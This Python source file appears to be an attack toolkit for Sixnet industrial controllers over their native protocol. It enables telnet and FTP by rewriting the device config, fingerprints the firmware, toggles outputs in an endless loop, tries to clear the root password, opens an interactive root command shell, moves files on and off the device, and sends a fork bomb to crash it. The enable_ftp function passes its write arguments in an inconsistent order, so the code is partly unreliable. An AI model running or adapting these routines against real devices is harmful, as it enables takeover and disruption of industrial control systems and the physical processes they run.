import file_manip
from SUP_message import sup_msg
import STX_Networking, time

def enable_ftp(ip):
    sixnet_config = "/etc/stacfg/general.config"
    """Enables telnet on a sixnet device if it is not already enabled"""
    print("enabling ftp...")
    config = file_manip.get_file(ip, sixnet_config)

    #find telnet part and change it from 0 to 1
    new_config = config.replace("enable ftp=0", "enable ftp=1")

    file_manip.write_file(sixnet_config, new_config, ip)
    print("Success!")

def enable_telnet(ip):
    sixnet_config = "/etc/stacfg/general.config"
    """Enables telnet on a sixnet device if it is not already enabled"""
    print("enabling telnet...")
    config = file_manip.get_file(ip, sixnet_config)

    #find telnet part and change it from 0 to 1
    new_config = config.replace("enable telnet=0", "enable telnet=1")

    file_manip.write_file(ip, sixnet_config, new_config)
    print("Success!")

def blinkenlights(ip):
    """set and clear discreet outputs for funsies"""
    pkt = sup_msg()
    #alternate lights blunked with half second interval
    while(True):
        pkt.set_digital(12) #3
        STX_Networking.send_msg(pkt.create(), ip)
        time.sleep(.5)
        pkt.set_digital(3)
        STX_Networking.send_msg(pkt.create(), ip)
        time.sleep(.5)

def fingerprint(ip):
    """Gets the Sixnet firmware version, network settings, station number, and OS version"""
    file = "/etc/sxbuildinfo.txt"
    build_info = file_manip.get_file(ip, file)

    #format the build info to remove unnecessary data
    build_info = build_info.split("\t")
    build_info = build_info[0] + " " +  build_info[1]

    #TODO: Find analog/digital inputs/outputs
    #I think the only way to do it is to query each one and see if I get a response or an error or something
    #After much fiddling this thing will let you read from or write to 8192 input and output registers with out telling you that
    #only 4 of those are actually being used. 

    #just send a uname command over
    os_ver = STX_Networking.send_command(ip,"uname -sr").data[4:-2].decode("hex")
    #same for hostname
    hostname = STX_Networking.send_command(ip,"hostname").data[4:-2].decode("hex")

    #station number
    gencfg = file_manip.get_file(ip, "/etc/stacfg/general.config")
    #pull it out of the general config file
    gencfg = gencfg.splitlines()
    stat_num = ""
    for line in gencfg:
        if line.find("station number=") != -1:
            stat_num = line[line.find("=")+1:]    #the number is right after the =
            break;


    print ("Firmware:\t" + build_info)
    print ("OS: \t\t" + os_ver)
    print ("Host:\t\t" + hostname)
    print ("Station #:\t" + stat_num)
  
def clear_pass(ip):
    """Removes the password for the current user (most likely root)"""
    #find out who you are
    whoami = STX_Networking.send_command(ip, "whoami")
    #strip off header of data ( a null and a 0x05 or something)
    whoami = whoami.data[4:].decode("hex")
    #strip off newline
    whoami = whoami[:4]

    print ("clearing password for " + whoami)
    STX_Networking.send_command(ip,"passwd")
      
def sup_shell(ip):
    """A very root shell for interfacing with the sixnet device at the designated ip"""
    print("Sixnet Universal Protocol shell v0.1")
    #find out who you are
    whoami = STX_Networking.send_command(ip, "whoami")
    #strip off header of data ( a null and a 0x05 or something)
    whoami = whoami.data[4:].decode("hex")
    #strip off newline
    whoami = whoami[:4]

    while(True):
        #read in the shell command from the user and send that shit off
        input = raw_input(whoami + "$ ")
        if(input == "exit"):
            break

        reply = STX_Networking.send_command(ip, input + "\n")

        #Decode the reply and print it
        print (reply.data[4:].decode("hex"))

def get_file(ip, src, dst = None):
    print ("reading...")
    if(dst == None):
        print (file_manip.get_file(ip,src,dst))
    else:
        file_manip.get_file(ip,src,dst)
    print ("done")

def write_file(ip, src, dst):
    print ("writing...")
    f = open(src, "r")
    #cat the file contents
    file_manip.write_file(ip, dst, f.read())

def forkbomb(ip):
    STX_Networking.send_command(ip, "p(){ p|p& }; p")
    print ("boom")